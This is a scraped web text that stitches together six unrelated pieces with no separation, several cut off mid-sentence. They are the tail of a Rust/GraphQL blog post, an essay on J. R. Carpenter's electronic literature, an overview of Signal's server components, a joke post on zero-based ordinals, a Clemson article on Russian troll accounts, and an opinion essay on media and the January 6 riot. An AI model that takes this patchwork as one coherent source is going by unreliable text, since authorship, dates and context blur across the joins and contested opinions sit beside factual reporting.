You give it a range of things it could query, and the application - React or something else - sends arbitrary queries to the backend.</p><p>This makes things <em>hard</em> for the backend. Any sort of SQL-level optimization is impossible - your server is writing dynamic SQL, so you rely on the intelligence of your GraphQL server, which is not always high. Juniper, for example: n+1 queries by default. The workaround - <a href="https://graphql-rust.github.io/juniper/master/advanced/dataloaders.html">a dataloader</a> - is rough and independently maintained. So at the end of the day, you’re going to have a blisteringly-fast application layer that’s spending all of its time inefficiently querying your database.</p><p>The word is that GraphQL works really well with non-SQL databases which can serve these sorts of requests fast. I’m sure that there’s some special database used internally at Facebook that’s incredible in combination with GraphQL, but the rest of industry is pretty attached to Postgres and its ilk, <a href="https://info.crunchydata.com/blog/postgres-the-batteries-included-database">for good reason</a>.</p><h3 id="lets-have-some-caveats">Let’s have some caveats!</h3><p>So I tried to lead with the main caveat: this isn’t about Rust in general. It’s about using the language and its ecosystem for a particular goal. Simple web APIs.</p><p>The caveat to that: in the general sense, you can build a website with anything and be successful. Remember how OkCupid was <a href="https://github.com/OkCupid/okws">implemented in C++</a>. There’s a popular <a href="https://www.costarastrology.com/">astrology app, Co-star</a>, that’s all Haskell. If you’re great at writing some language and you can hire other people with lots of talent, you can do it and be heroes.</p><p>Another caveat: what I was trying to build was a <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a>-heavy web application API for a website. It wasn’t a web “service” as you might call them nowadays, something that …</p></div></div>

                <p><strong>Below is a brief introduction to J. R. Carpenter's <em>...and by islands I mean paragraphs</em> (2014).</strong></p><p><strong>Read <em>...and by islands I mean paragraphs</em> for yourself online <a href="http://luckysoap.com/andbyislands">here</a>.</strong></p><p><strong>Then, consider <a href="https://zoom.us/meeting/register/tJUrcOCtqj0pG9xBrEs_3AivzFWihLC3deT-">registering to join</a> a free, live, open group discussion with J. R. Carpenter – scheduled for this Saturday, January 16th at 12 PM EST.</strong></p><hr><p>Reading is fundamentally navigational. One basic level of literacy is the ability to navigate linearly through a linear text. A higher level would be the ability to take in information at a glance and move more liberally through a long selection of text, such as finding the one paragraph in a book which describes the concept you want to explore.</p><p>With word processing on computers, a further level of navigation is technological literacy: the ability to utilize elements of the interface, through devices such as a keyboard and mouse, to move to different sections, pages, precise character points, etc.</p><p>Above this is the metaphorical referent of navigating through physical space. <a href="https://www.digitalhumanities.org/dhq/vol/5/3/000103/000103.html">Locative narratives</a> are navigational in this way. As a reader, you must physically move through the world, being tracked along the way by GPS technology, and your access to new parts of text are guided not by knowing how to navigate a page (or its simulated equivalent on a screen) but a specific real-world area. The most famous instance of locative media would be <em>Pokémon Go</em>, which was non-narrative, but did embed information locationally, guiding users to cluster around various local hot-spots. You can perhaps imagine how such technology could be used to situate narrative beats in a particular space and immerse the reader in the navigational behavior of a character.</p><p>J. R. Carpenter's <em>...and by islands I mean paragraphs</em> combines elements of (simulated) physical navigation and navigating a computer interface. Previously, Carpenter had used Google Maps to place narrative components into a more familiar map view. Here, the background is a light grid, over which is placed sketched images of islands.</p><figure><img src="https://www.precursorpoets.com/content/images/2021/01/islandsparagraphs.jpg" alt="Part of the opening screen of ...and by islands I mean paragraphs" srcset="https://www.precursorpoets.com/content/images/size/w600/2021/01/islandsparagraphs.jpg 600w, https://www.precursorpoets.com/content/images/2021/01/islandsparagraphs.jpg 841w" sizes="(min-width: 720px) 720px"><figcaption><em>Part of the opening screen of</em> ...and by islands I mean paragraphs</figcaption></figure><p>This is not a locative narrative, nor would it be ever viable to achieve any substantial readership for a work which required reading an actual drawn map of the sea and physically traveling to various islands. Still, it is worth keeping in mind the existence and logic of locative narratives. Narrative is not necessarily a linear thing given in a sequential order. Text can simply be <em>in places</em>, and we as readers have to travel to that text.</p><p>The page defaults to a central position, with the ability to scroll left, right, up, or down – reimagined through the image of a compass rose as cardinal directions. Instructions visible in the top-right corner explain that you can navigate with arrow keys. The instruction "Click on islands to rewrite paragraphs" explains not only the possibility it says, but also implicitly informs us that islands are the primary unit of text here (and by islands, I mean paragraphs).</p><p>While we might imagine the sketched islands as referring to a fixed place with some objective existence – marked by coordinates, by certain features, there for us to encounter – the paragraphs are personal. There's a speaker here telling a story, but the text keeps changing. Like in many of Carpenter's other works, these are variable texts. Component parts of each paragraphs shift independently, though each island generally coheres around a given topic. As she write in her <a href="http://luckysoap.com/andbyislands/bibliography.html">sources page</a>,</p><blockquote>Individually, each of these textual islands is a topic - from the Greek topos, meaning place. Collectively they constitute a topographical map of a sustained practice of reading and re-reading and writing and re-writing islands. In this constantly shifting sea of variable texts one never finds the same islands twice... and by islands, I do mean paragraphs.</blockquote><p>The first island we see when we open the page are the Galápagos Islands in real life and "isle6" in the source code. There we can see the core structure of the line: "My island #{island} #{volcano}. #{climate} #{beaches}. As I walked along, #{walk}. The tortoises #{tortoises}. #{dreams}. #{complaint}".</p><p>The terms in the braces are variables, corresponding to the banks of text above. Accordingly, "#{island}" can complete the opening "My island" with lines such as "seemed to be a sort of cloud-dump." or "- a little world within itself." These are just two of ten such variable possibilities for just that one half-line. The full paragraph has eight variables, and each variable is selected independently, so there are many possible overall variations of this paragraph.</p><figure><img src="https://images.unsplash.com/photo-1552922554-a6e96ef985a0?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDR8fGdhbGFwYWdvc3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="" srcset="https://images.unsplash.com/photo-1552922554-a6e96ef985a0?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDR8fGdhbGFwYWdvc3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1552922554-a6e96ef985a0?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDR8fGdhbGFwYWdvc3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1552922554-a6e96ef985a0?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDR8fGdhbGFwYWdvc3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1552922554-a6e96ef985a0?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDR8fGdhbGFwYWdvc3xlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@rluijtenant?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Ruud Luijten</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>If you do not click, the text will eventually shift to a new variable on its own. If you click, the text will shift as often as you click. The variable nature of the islands (by which I mean paragraphs) is thus not wholly dependent on the reader, but does reward a sort of active listening.</p><p>Part of what enables the variable nature of the text is that the "I" is not one fixed person. Sources are given at the bottom of each island's code. For "isle6," we see that text was taken from Elizabeth Bishop's "Crusoe in England" and Charles Darwin's <em>The Voyage of the Beagle</em>. Other islands might draw on various other texts such as <em>Robinson Crusoe</em> itself or William Shakespeare's <em>The Tempest</em>. This is thus a highly literary sea. The sea as imagined through literature is here (at least in part) made navigable, in a manner which simulates moving – through vast expanses of nothing – from island to island.</p><p>Notably, though, whereas each time one returns to <em>The Tempest</em>, the text itself will be the same (even if our understanding will shift with age and experience). Here, that is not the case. You leave one island for another, then another. Eventually, you wind up back to an earlier point, but the text is different.</p><p>Outside of digging through the code and conceptually understanding the different possibilities, readers will never encounter the majority of possible expressions. Within readerly limitations as well, a reader has further choices: Sit on one shore forever trying to exhaust all possibilities, or explore broadly?</p><p>To return to my starting point, you can imagine a similar sort of consideration with a typical collection of poems. You read a short poem, and then you can go read any other. Situating such exploratory energy on an actual map, however, and having readers navigate through blankness to find and listen to different islands greatly expands our possibilities for navigating text.</p><p>Islands are paragraphs, but a paragraph you encounter at one moment is not the whole of what that island has to say, nor does any one island say everything there is to hear. Thrown into the middle of the sea – and by the sea, I mean literary history – how do you begin your travels? Where do you end your voyage? Wherever you leave off, you might find that parts of islands stick with you – and by "parts of islands," I mean variable texts.</p><hr><p><strong>Further Reading:</strong></p><p><a href="https://www.precursorpoets.com/hyperconnectivity-week6/">"Digital Nature"</a> – On J.

						<p><strong>Introduction<br>
</strong><br>
<a href="https://signal.org/">Signal</a> is an end-to-end encrypted communications application for Android and iOS similar to WhatsApp but open source. It uses the TCP/IP (Internet) to send one-to-one and group messages, which can include text, files, voice notes, images and videos, and make one-to-one voice and video calls. For user identification standard cellular mobile numbers are used.</p>
<p><img src="https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1.png" alt="" width="1123" height="794" srcset="https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1.png 1123w, https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1-300x212.png 300w, https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1-768x543.png 768w, https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1-1024x724.png 1024w" sizes="(max-width: 1123px) 100vw, 1123px"></p>

<p>The main system component is the Signal-Server which is maintained by Open Whisper Systems. The source code is available on GitHub (https://github.com/signalapp/Signal-Server) only for audition purposes without providing additional documentation about on premises installations. In the following sections I will provide some information about the system components and their interconnections.</p>
<p><strong>System components</strong></p>
<p><em>Signal-Server –</em> is the central element of the Signal Messenger ecosystem, being constantly developed by Open Whisper Systems. It manages the registration of new accounts, stores and distributes the public keys of the clients, relays and temporarily stores&nbsp; the end-to end encrypted messages, enforces rate limits in order to avoid denial of service attacks and provides pre-signed URLs to the mobile client for uploading files. Signal-Server is entirely written in Java; source code is available at the following URL: https://github.com/signalapp/Signal-Server .&nbsp; An additional <a href="https://www.postgresql.org/" target="_blank" rel="noopener">PostgreSQL</a> database and<a href="https://redis.io/" target="_blank" rel="noopener"> Redis</a> NoSQL object store are needed in order to run the Signal-Server. The configuration is stored in a yml file (at a first glance it seems quite complex) and is passed as a command line argument to the java binaries. Before running Signal-Server the Push-Server must be up and running.</p>
<p><em>Push-Server</em> – acts as a gateway between Signal-Server and Google Cloud Messaging / Apple Push Notification Service. It is entirely written in Java and the configuration is sored in a yml file which must be passed as an command line argument to the java binaries. Source code is available at&nbsp;https://github.com/signalapp/PushServer . Without the push service the App has to be permanently connected to the Signal-Server in order to receive the messages, thus reducing the battery life of the mobile device or the user hast manually check for new messages by opening the App.</p>
<p><em>STUN/TURN Server –&nbsp;</em> is a VoIP media traffic NAT traversal server and gateway. It is used for establishing voice and video calls. For this component you can use a standard On-premises or Cloud TURN implementation, such as Linux Coturn (https://github.com/coturn/coturn) which is available as a standard package on the majority of Linux distributions. If you do not need voice/video calls this component can be omitted. <em><br>
</em></p>
<p><em>Signal App</em> – is the only visible part to the end user. It&nbsp; is developed and&nbsp; maintained by Open Whisper Systems. At the time of writing there is a Android and an iOS version. A desktop (Linux, Windows, Mac ) version is also available but it lacks registration and calling support, being more like an extension of the mobile App for desktop usage.</p>
<p><em>Twilio</em> – is a cloud communications platform. In this scenario it allows the Signal-Server to make phone calls and send&nbsp; text messages using its web service APIs. It is used only during the registration phase to confirm the users mobile phone number. Twilio’s services are accessed over HTTP and are billed based on usage.</p>
<p><em>Amazon S3 (Simple Storage Services)</em> – is a web service offered by Amazon Web Services (AWS). It is used to exchange encrypted files between the Signal clients. In contrast to the text messages which are relayed through the Signal-Server the files are temporarily stored using an external service. The protocol works as follows: the Signal client request an URL from Signal-Server, the server computes a <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/PresignedUrlUploadObject.html">pre-signed URL</a> having a limited validity and sends it to the client, the client uploads the encrypted file to Amazon S3 and then sends the link to its peer. Amazon S3 services are accessed over HTTP and are billed based on usage. If you do not need file transfers this component can be omitted.</p>
<p><em>Google Cloud Messaging (GCM)</em> – is a mobile notification service developed by Google that enables Signal-Server to send notification data to Signal Apps that target the Android Operating System. GCM is a free service ant it is accessed over HTTP.</p>
<p><em>Apple Push Notification Service (APNs)</em> – is platform notification service created by Apple Inc. that enables the Signal-Server to send notification data to Signal Apps installed on Apple devices. APNs doesn’t cost anything.</p>
<p>In addition to the end-to-end encryption, the transport between the Signal App and the Signal-Server is secured using TLS and <a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning">certificate pinning</a>. The Signal-Server implements a API protocol for communicating with the Signal Apps which is available at https://github.com/signalapp/Signal-Server/wiki/API-Protocol (document might be outdated).</p>

        <h2 itemprop="headline">Zero-based ordinals</h2>
        <p itemprop="about"><i>This is the televenth post of my blog.</i></p>
        <p>
        by  on <i itemprop="datePublished">2020-09-20</i></p>
        <p><span itemprop="articleBody">
          <p>Many programming languages use <a href="https://en.wikipedia.org/wiki/Zero-based_numbering#Usage_in_programming_languages">Zero-Based
Indexing</a>
for referring to the elements of a list. There are a number of strong technical
reasons why this is convenient, but I won't be talking about them this article.</p>

<p>Oftentimes, when discussing zero-based indexing it is useful to refer to the
element at the start of the collection as the "zeroth" element, as an analogy to
the ordinal "first" in one-based numbering. This serves as a reminder that we're
talking about the element at the start, and not the element at position one,
which could ambiguously also be referred to as the first. The word zeroth can be
used in computer documentation to be rigorously unambiguous.</p>

<p>Because of <a href="https://en.wikipedia.org/wiki/Benford%27s_law">Benford's Law of
Numbers</a>, the use case for the
zero-based ordinals numbering beyond one don't come up much. You're much more
likely to care about the zeroth element than the element at position 2,235, or
ever position 6.</p>

<p>Which means that there may be an open opporunity to propose names for them. I
humbly submit:</p>

<ol start="0">
<li> Zeroth </li>
<li> Firstend </li>
<li> Secord </li>
<li> Thirth </li>
<li> Fourfth </li>
<li> Fixth </li>
<li> Sixenth </li>
<li> Seventh </li>
<li> Eighnth </li>
<li> Nenth </li>
<li> and Televenth </li>
</ol>

<p>I'm appealing to Benford's law again, to justify leaving the numbers beyond the
televenth to a future discoverer.</p>

<div><section itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><p><strong>Here’s what Russia’s 2020 disinformation operations look like, according to two Clemson experts on social media and propaganda</strong></p></section></div>

<div itemprop="image" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><div><div><div><div><p>Darren Linvill (left) and Patrick Warren (right)</p></div></div><p><img src="https://i2.wp.com/clemson.world/wp-content/uploads/2020/10/Troll_Researchers-Walking.jpg?fit=1100%2C733&amp;ssl=1" alt="" title="Troll_Researchers Walking" height="733" width="1100" itemprop="thumbnailUrl"></p></div></div></div>

<div><section itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><div itemprop="text"><p>Internet trolls don’t troll.&nbsp;Not the professionals at least. Professional trolls don’t go on social media to antagonize liberals or belittle conservatives. They are not narrow minded, drunk or angry. They don’t lack basic English language skills. They certainly aren’t “somebody sitting on their bed that weighs 400 pounds,” as the president once put it. Your stereotypical trolls do exist on social media, but the amateurs aren’t a threat to Western democracy.</p>
<p>Professional trolls, on the other hand, are the tip of the spear in the new digital, ideological battleground. To combat the threat they pose, we must first understand them — and take them seriously.</p>
<p>On August 22, 2019, @IamTyraJackson received almost 290,000 likes on Twitter for a single tweet. Put in perspective, the typical tweet President Trump sends to his 67 million followers gets about 100,000 likes. That viral tweet by<span>&nbsp;</span>@IamTyraJackson was innocent: an uplifting pair of images of former pro football player Warrick Dunn and a description of his inspiring charity work building houses for single mothers. For an anonymous account that had only existed for only a few months, “Tyra” knew her audience well. Warrick’s former coach, Tony Dungy, retweeted it, as did the rapper and producer Chuck D. Hundreds of thousands of real users viewed Tyra’s tweet and connected with its message. For “Tyra,” however, inspiring messages like this were a tool for a very different purpose.</p>
<p>The purpose of the Tyra account, we believe, was not to spread heartwarming messages to Americans. Rather, the tweet about Warrick Dunn was really a Trojan horse to gain followers in a larger plan by a foreign adversary. We think this because we believe @IamTyraJackson was an account operated by the successors to Russia’s Internet Research Agency (IRA). Special Counsel Robert Mueller indicted the IRA for waging a massive information war during the 2016 U.S. election. Since then, the IRA seems to have been subsumed into Russia’s Federal News Agency, but its work continues. In the case of @IamTyraJackson, the IRA’s goal was two-fold: Grow an audience in part through heartwarming, inspiring messages, and use that following to spread messages promoting division, distrust and doubt.</p>
<p>We’ve spent the past two years studying online disinformation and building a deep understanding of Russia’s strategy, tactics and impact. Working from data Twitter has publicly released, we’ve read Russian tweets until our eyes bled. Looking at a range of behavioral signals, we have begun to develop procedures to identify disinformation campaigns and have worked with Twitter to suspend accounts. In the process we’ve shared what we’ve learned with people making a difference, both in and out of government. We have experienced a range of emotions studying what the IRA has produced, from disgust at their overt racism to amusement at their sometimes self-reflective humor. Mostly, however, we’ve been impressed.</p>
</div></section></div>

<div><section itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><p><strong>Tweets are framed to serve Russia’s interests in undermining Americans’ trust in our institutions.</strong></p></section></div>

<div><section itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><div itemprop="text"><p>Professional trolls are good at their job. They have studied us. They understand how to harness our biases (and hashtags) for their own purposes. They know what pressure points to push and how best to drive us to distrust our neighbors. The professionals know you catch more flies with honey. They don’t go to social media looking for a fight; they go looking for new best friends. And they have found them.</p>
<p>Disinformation operations aren’t typically fake news or outright lies. Disinformation is most often simply spin. Spin is hard to spot and easy to believe, especially if you are already inclined to do so. While the rest of the world learned how to conduct a modern disinformation campaign from the Russians, it is from the world of public relations and advertising that the IRA learned their craft. To appreciate the influence and potential of Russian disinformation, we need to view them less as Boris and Natasha and more like Don Draper.</p>
<p>As good marketers, professional trolls manipulate our emotions subtly. In fall 2018, for example, a Russian account we identified called @PoliteMelanie re-crafted an old urban legend, tweeting: “My cousin is studying sociology in university. Last week she and her classmates polled over 1,000 conservative Christians. ‘What would you do if you discovered that your child was a homo sapiens?’ 55% said they would disown them and force them to leave their home.” This tweet, which suggested conservative Christians are not only homophobic but also ignorant, was subtle enough to not feel overtly hateful, but was also aimed directly at multiple cultural stress points, driving a wedge at the point where religiosity and ideology meet. The tweet was also wildly successful, receiving more than 90,000 retweets and nearly 300,000 likes.</p>
<p>This tweet didn’t seek to anger conservative Christians or to provoke Trump supporters. She wasn’t even talking to them. Melanie’s 20,000 followers, painstakingly built, weren’t from #MAGA America (Russia has other accounts targeting them). Rather, Melanie’s audience was made up of educated, urban, left-wing Americans harboring a touch of self-righteousness. She wasn’t selling her audience a candidate or a position — she was selling an emotion. Melanie was selling disgust. The Russians know that, in political warfare, disgust is a more powerful tool than anger. Anger drives people to the polls; disgust drives countries apart.</p>
<p>Accounts like @IamTyraJackson have continued @PoliteMelanie’s work. Professional disinformation isn’t spread by the account you disagree with — quite the opposite. Effective disinformation is embedded in an account you agree with. The professionals don’t push you away, they pull you toward them. While tweeting uplifting messages about Warrick Dunn’s real-life charity work, Tyra, and several accounts we associated with her, also distributed messages consistent with past Russian disinformation. Importantly, they highlighted issues of race and gender inequality. A tweet about Brock Turner’s Stanford rape case received 15,000 likes. Another about police targeting black citizens in Las Vegas was liked more than 100,000 times. Here is what makes disinformation so difficult to discuss: while these tweets point to valid issues of concern — issues that have been central to important social movements like Black Lives Matter and #MeToo — they are framed to serve Russia’s interests in undermining Americans’ trust in our institutions.</p>
</div></section></div>

<div itemprop="image" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><div><p><img src="https://i1.wp.com/clemson.world/wp-content/uploads/2020/10/Troll_Institutions.jpg?fit=1100%2C1351&amp;ssl=1" alt="" title="Troll_Institutions" height="1351" width="1100" itemprop="thumbnailUrl"></p></div></div>

<div><section itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><div itemprop="text"><p>These accounts also harness the goodwill they’ve built by engaging in these communities for specific political ends. Consistent with past Russian activity, they attacked moderate politicians as a method of bolstering more polarizing candidates. Recently, Vice President Biden has been the most frequent target of this strategy, as seen in dozens of tweets such as, “Joe Biden is damaging Obama’s legacy with his racism and stupidity!” and “Joe Biden doesn’t deserve our votes!”</p>
<p>The quality of Russia’s work has been honed over several years and millions of social media posts. They have appeared on Instagram, Stitcher, Reddit, Google+, Tumblr, Medium, Vine, Meetup and even Pokémon Go, demonstrating not only a nihilistic creativity, but also a ruthless efficiency in volume of production. The IRA has been called a “troll farm,” but they are undoubtedly a factory.</p>
<p>While personas like Melanie and Tyra were important to Russian efforts, they were ultimately just tools, interchangeable parts constructed for a specific audience. When shut down, they were quickly replaced by other free-to-create, anonymous accounts. The factory doesn’t stop. They attack issues from both sides, attempting to drive mainstream viewpoints in polar and extreme directions.</p>
<p>In a free society, we must accept that bad actors will try to take advantage of our openness. But we need to learn to question our own and others’ biases on social media. We need to teach — to individuals of all ages — that we shouldn’t simply believe or repost anonymous users because they used the same hashtag we did, and neither should we accuse them of being a Russian bot simply because we disagree with their perspective. We need to teach digital civility. It will not only weaken foreign efforts, but it will also help us better engage online with our neighbors, especially the ones we disagree with.</p>

<div><section itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><p><strong>They know what pressure points to push and how best to drive us to distrust our neighbors.</strong></p></section></div>

<div><section itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><div itemprop="text"><p>Russian disinformation is not just about President Trump or the 2016 presidential election. Did they work to get Trump elected? Yes, diligently. Our research has shown how Russia strategically employed social media to build support on the right for Trump and lower voter turnout on the left for Clinton. But the IRA was not created to collude with the Trump campaign. They existed well before Trump rode down that escalator and announced his candidacy, and we assume they will exist in some form well after he is gone. Russia’s goals are to further widen existing divisions in the American public and decrease our faith and trust in institutions that help maintain a strong democracy. If we focus only on the past or future, we will not be prepared for the present. It’s not about election 2016 or 2020.</p>
<p>The IRA generated more social media content in the year following the 2016 election than the year before it. They also moved their office into a bigger building with room to expand. Their work was never just about elections. Rather, the IRA encourages us to vilify our neighbor and amplify our differences because, if we grow incapable of compromising, there can be no meaningful democracy. Russia has dug in for a long campaign. So far, we’re helping them win.</p>

			<!-- .cover -->

			<div>


				<div id="post-content">
					<blockquote><em>“Ever his whispering was in your ears, poisoning your thought, chilling your heart, weakening your limbs, while others watched and could do nothing, for your will was in his keeping.”</em></blockquote><p>Gandalf to Theoden, Chapter VI, "The King of the Golden Hall", The Two Towers, <em>Lord of the Rings</em></p><hr><p>Well that escalated steadily for four years. The fallout from the #MAGA riot is pretty much the only story on the internet right now and with reports of further insurrection looming ahead of a presidential inauguration, the National Guard being deployed in force and a second impeachment on the table, it's hard to really think about anything else. Amidst all the finger pointing, one of the biggest missing pieces seems to be the culpability of the mainstream press and to understand why, it helps to turn to JRR Tolkien. Yes, I know you’re not supposed to use <em>Lord of the Rings</em> metaphors once you’re over the age of 15 but just bear with me here.</p><p>First off, let’s acknowledge that for sheer entertainment value, this one was hard to beat. Shirtless shamans and white supremacists rampaging through the halls of Congress makes for some great television and if you think that sounds disrespectful to the memories of the five people who died, then you may not have been paying attention to what the news media has actually become in the last two decades of American life.</p><p>This is the kind of thing people now <em>want</em> to see happen, a prime-time product that combines the adrenaline of live sports with the intrigue of an HBO drama and the suspense of reality television. Breathless live commentary? Check. Endless replays and slow-motion analysis from multiple angles? You’ve been watching them all week, and so have we. Whispered conversations in the corridors of power and courtiers scrambling to realign loyalties? Take your pick. The lead character in imminent danger of leaving the show forever? Legions of fans, including some dressed in animal skins, are literally howling in protest.</p><p>While a lot of the blame has been placed on social media, not nearly enough has been given to the big news companies. They've done unbelievably well from the Trump story, especially in the last year, with a pandemic, a movement for racial justice and an election giving viewers even more reasons to tune in. Fox News viewership was up 43% in 2020, MSNBC climbed 23% and CNN jumped 83%. Fox News even made the top 10 for adults aged 18-49, despite its older skew, while CNN was up a whopping 95% percent in that demographic and had its most-watched prime time ratings ever.</p><p>America is now home to a political-media complex that profits on malice, division and indignation, yet professes shock and horror when real conflict happens. That's why when the barricades came down, the cameras were there beaming images to the news anchors to gasp at in horror. The revolution <em>was </em>televised, packaged up and sold to millions who tuned in to see what would happen (NBC and ABC’s coverage of the mob dominated prime time ratings on the evening of January 6th, drawing in 5.4 million and 4.2 million viewers, respectively).</p><p>In the aftermath, more of the same. A bad day for US politics is now the darkest day for democracy since 1816. Donald Trump isn’t just a politician who miscalculated – he’s the greatest threat to American democracy since the Civil War. A bunch of armed away fans are suddenly fascist terrorists who tried to overthrow the government (they weren’t). This might be an unpopular opinion to share with some of our more left-leaning US readers, but the truth is that this wasn’t a coup or an insurrection. There was no real evidence of coordination between government officials, civilian or military. An ugly protest turned into a riot and then a lynch mob, and they should all be arrested and thrown in jail, but it wasn’t ever a real threat.</p><p>What all the Beltway pundits seem to be missing is that the goal wasn’t to overturn the results of the election or take Nancy Pelosi hostage. Last Wednesday’s riot was more like Comic Con for far-right streamers—an opportunity to meet other like-minded fans in meatspace, and grab the world’s attention. In that respect, it was an outstanding success. The QAnon/MAGA crowd suddenly have a rich new set of real world events and martyrs to add to their mythology, and in the midst of the worst week of the pandemic yet, with over 4,000 US citizens dying every day, these maskless assholes have earned the kind of mainstream coverage that social media influencers can only dream of, bringing a whole new meaning to the concept of a ‘viral’ flashmob.</p><p>America’s ageing, baby boomer politicians are playing right into their hands. The Democrats are doing their best Neymar impression, rolling around on the floor and clutching their knees in agony, while Republicans - having committed the most horrible of fouls - are now pleading with the referee for national unity. Leaving aside the sheer cynicism of this gambit from the party of voter suppression, border walls and “Lock her up!” you have to admit that once again, it's all very dramatic, and hard to turn away from. </p><p>Journalists scavenge for loot on the battlefield, scrambling for an angle that will rake in even more eyeballs and dollars. It’s a GOP civil war! AOC felt like her life was in danger! Will the impeachment scuttle Biden’s agenda? Anything that doesn’t fit the story format, which includes most of reality, is discarded, and the enormous narrative-making machine grinds along underneath, setting up a cliffhanger finale. A presidency built on fear, rage and division is climaxing in three acts: an insurrection, an impeachment and an inauguration (and wait until you see what’s in store next season).</p><hr><p>It’s been just two months since former US president Barack Obama solemnly told <em>The Atlantic</em> that his country was “entering into an epistemological crisis”, observes <a href="https://www.ft.com/content/d8c59645-0f30-4647-a577-8ef3cc37ceee">Gillian Tett</a>. “If we do not have the capacity to distinguish what’s true from what’s false, then by definition the marketplace of ideas doesn’t work,” he declared. “And by definition our democracy doesn’t work.” For most people, the obvious cause of this crisis is social media. There seems to be a clear link between the arrival of Twitter and Facebook and the transformation of US politics into a bloodsport. </p><p>In its own way however, this idea is an example of disinformation itself. There is a profound disconnect between broad public concern with social media's impact on public discourse, and persistent scientific evidence <a href="https://advances.sciencemag.org/content/6/14/eaay3539">that shows</a> exposure to online fake news is concentrated in a tiny minority of users. According to the most recent <a href="https://www.journalism.org/2020/07/30/americans-who-mainly-get-their-news-on-social-media-are-less-engaged-less-knowledgeable/" rel="noopener noreferrer">Pew survey</a>, less than 20% of Americans rely on social media as their major source of political news. Television by contrast, is the primary source of political news for about 30% of the population, and news websites or apps account for another 25%. </p><p>That means that television and newspapers, not Twitter, are responsible for the conspiracy theories. Take, for example, the Big Lie of mail-in voting during the 2020 elections. Around half of Republican voters considered fraud a major problem with voting by mail, and more than half pointed to Democrats as the most likely perpetrators of election interference. This lie, despite being repeatedly disproven by the most rigorous academic and legal investigations, set the foundations for Trump to claim that the election was stolen from him - leading eventually to the incitement of last week's riot. </p><p>To understand how disinformation about the mail-in ballots spread, Professor Yochai Benkler, and his team from Harvard Law School<strong> </strong>analyzed 55,000 online media stories, 5 million tweets, and 75,000 posts on public Facebook pages. <a href="https://cyber.harvard.edu/publication/2020/Mail-in-Voter-Fraud-Disinformation-2020" rel="noopener noreferrer">Their findings</a> showed that the lies that shaped the views of tens of millions of American voters did not originate in social media or via a Russian attack. Instead, they were driven by some of the biggest media outlets in the country, including not just Fox News, but 'centre-right' outlets like the<em> Wall Street Journal</em> and the <em>New York Post. </em></p><p>What this means is that the usual suspects in public debates about disinformation were not the central actors in voting disinformation. There were no instances where clickbait factories, fake pages (Russian or otherwise), or Facebook’s algorithms could explain any peak in engagement that was not better explained as having been set in motion and heavily promoted by political figures and elite right-wing media personalities, and disseminated to millions by major media outlets. <em>"S</em>ocial media" the study concluded, "played only a secondary, supportive role."</p><p>For a democracy to work, elections need to not be viewed as existential risks, arguments need to be made off the basis of a shared set of facts, and political opponents need to treat each other in good faith and respect each other with intellectual honesty (and try not to burn any buildings to the ground). On all of these counts, mainstream American news companies are, and will continue to be, a far greater threat to democracy than Facebook or riot mobs or Donald Trump. </p><hr><p>I've been thinking a lot about Grima Wormtongue in the past week. Not Peter Jackson's over-the-top, sleazy version, who was the most obvious bad guy in all of movie history (the less said about his butchering of the <em>King of the Golden Hall</em> scene the better). I'm talking about Tolkien's original Wormtongue, who's a little more like Littlefinger in Game of Thrones. "Upon the steps sat a wizened figure of a man, with a pale wise face and heavy-lidded eyes (...) he laughed grimly, as he lifted his heavy lids for a moment and gazed at the strangers with dark eyes." Malevolent and brooding, certainly, but not Brad Dourif's cartoon-villain troglodyte. </p><p>Wormtongue is of course, part of a rich tradition of sinister councilors whispering in a kindly King's ear, from Jafar to Dominic Cummings. What makes him unique however, is the way he controls Théoden. By constantly restating bad news, and casting events in the worst possible light, …</p></div></div></article></div>

